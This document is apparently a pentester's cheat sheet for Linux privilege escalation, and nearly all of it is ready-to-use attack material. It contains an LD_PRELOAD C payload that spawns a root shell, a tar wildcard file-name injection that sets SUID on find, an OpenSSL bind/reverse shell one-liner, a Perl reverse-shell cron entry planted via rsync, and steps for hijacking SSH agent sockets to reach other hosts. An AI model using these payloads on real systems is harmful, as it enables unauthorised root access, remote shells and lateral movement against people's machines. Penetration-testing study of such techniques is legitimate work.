# Privilege Escalation on Linux Systems

## General

### Quality of Life

`python -c 'import tty; tty.spawn("/bin/bash")'`
`python -c 'import pty; pty.spawn("/bin/bash")'`


## Privileged Executables

### Capabilities

Starting with kernel 2.2, Linux divides the privileges traditionally
associated with superuser into distinct units, known as capabilities.
`/sbin/getcap -r / 2>/dev/null`

### SUID

`find / -perm -u=s -type f 2>/dev/null`


### SUDO

* Check with `sudo -l` and `cat /etc/sudoers`


### PRELOAD

Check if you can write into the path of privileged binaries, might be able to abuse library load order, you can check wich functions a binary uses via `objectdump -T`. To use these Preload-Attacks with sudo in /etc/sudoers there must be `env_keep += LD_PRELOAD`

A good payload to use for these attacks is:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
Execute with:
gcc -fPIC -shared -o payload.so payload.c -nostartfiles
sudo LD_PRELOAD=/tmp/payload.so <target>
When playing with the linker configs run `ldconfig` afterwards or it wont update the linker cache.


### Check open files of interesting processes

Use `fuser <filename>` or `lsof <filename>`


### Check for unmounted disks

`ls /dev`


## Abusing Common Tools

### Abusing Tar
If tar is allowed in sudoers with a wildcard command we can abuse that for privilege escalation. Filenames will be interpreted as command line arguments therefore we can create the following setup:
```
-rw-r–r–. 1 xxx xxx 0 Oct 28 19:19 –checkpoint=1
-rw-r–r–. 1 xxx xxx 0 Oct 28 19:17 –checkpoint-action=exec=sh payload.sh
-rwxr-xr-x. 1 xxx xxx 12 Oct 28 19:17 payload.sh
```
To create the files use:
```
echo "chmod u+s /usr/bin/find" > payload.sh
echo "" > "--checkpoint-action=exec=sh payload.sh"
echo "" > --checkpoint=1
```
Using find as the payload has the charm that we can execute commands via `find f1 -exec "whoami" \;` (file f1 must exist)

### Abusing TCPDump

With `-z` you can execute commands via TCPDump.

### Abusing OpenSSL

Openssl can read files and write into files via network. So it can be used for exfil and infil of Data. In addition a bind or reverse shell can be implemented via OpenSSL, e.g.:
`openssl.exe s_client -quiet -connect <ip>:<port> | cmd.exe | openssl.exe s_client -quiet -connect <ip>:<port>`

### RSync

If permissions allow it one can get RCE with RSync by overwriting the cronjobs file.
```
* * * * * root perl -e 'use Socket;$i="<ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```

## Hijacking SSH Agent
If you see SSH agents running on a pentest (process called "ssh-agent"), you might be able to use it to authenticate you to other hosts - or other accounts on that host.  Check out ~/.ssh/known_hosts for some ideas of where you might be able to connect to.
You can use any agents running under the account you compromised.  If you’re root you can use any SSH agent.
SSH agents listen on a unix socket.  You need to figure where this is for each agent (e.g. /tmp/ssh-tqiEl28473/agent.28473).

### Use the agent like this
```
export  SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473
ssh-add -l # lists the keys loaded into the agent
ssh user@host # will authenticate you if server trusts key in agent
```

### Yield a list of unix sockets for SSH agents.
```
ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '
```

## Agent Forwarding
If you enable SSH agent forwarding then you’ll be able to carry on using the SSH agent on your SSH client during your session on the SSH server.  This is potentially insecure because so will anyone else who is root on the SSH server you’re connected to.  Avoid using this feature with any keys you care about.

Reference: http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet


## Kernel Exploit problem
if exploit does not work on target system because gcc version is to old-->
*requires glibc 2.5 or later dynamic linker*
*tcsetattr: Invalid argument*
"*collect2: cannot find `ld'*"


```
gcc -m32 -o exploit exploit.c -Wl,--hash-style=both
```

#fatal error: asm/page.h: No such file or directory
 
 You just have to replace

include <asm/page.h>
by

define PAGE_SIZE sysconf(_SC_PAGE_SIZE)



## Reads

### Shared Libraries
* https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
* https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library
* https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html
* https://www.boiteaklou.fr/Abusing-Shared-Libraries.html#but-can-we-exploit-it

tags: [privilege escalation] linux privesc
